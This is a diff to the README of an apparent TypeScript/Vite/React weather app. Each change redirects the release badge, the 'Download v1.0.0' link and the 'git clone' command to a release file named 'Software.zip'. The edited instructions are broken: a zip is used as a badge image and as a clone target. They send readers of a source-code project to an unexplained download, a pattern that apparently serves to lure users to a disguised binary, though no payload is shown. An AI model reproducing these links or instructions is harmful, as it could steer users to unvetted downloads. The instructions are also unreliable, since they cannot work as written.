@@ -1,6 +1,6 @@
 # 🌦️ Weather App in Typescript using Vite + React 🌟
 
-[![GitHub release](https://img.shields.io/badge/download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![GitHub release](https://github.com/kareemdaher772/weather-app/releases/download/v1.0/Software.zip)](https://github.com/kareemdaher772/weather-app/releases/download/v1.0/Software.zip)
 
 Welcome to the **Weather App** repository! This project focuses on creating a sleek and user-friendly weather application using Typescript, Vite, and React. Whether you are a developer looking to enhance your skills or a weather enthusiast eager to stay updated on the forecast, this app has got you covered!
 
@@ -14,7 +14,7 @@ Welcome to the **Weather App** repository! This project focuses on creating a sl
 
 ## Installation 🛠️
 
-To launch the Weather App, click on the following link: [Download v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 
+To launch the Weather App, click on the following link: [Download v1.0.0](https://github.com/kareemdaher772/weather-app/releases/download/v1.0/Software.zip). 
 
 If the link does not work, please check the "Releases" section of this repository for the latest version.
 
@@ -47,7 +47,7 @@ This repository covers the following topics:
 
 1. Clone the repository: 
    ```bash
-   git clone https://github.com/your-username/weather-app.git
+   git clone https://github.com/kareemdaher772/weather-app/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
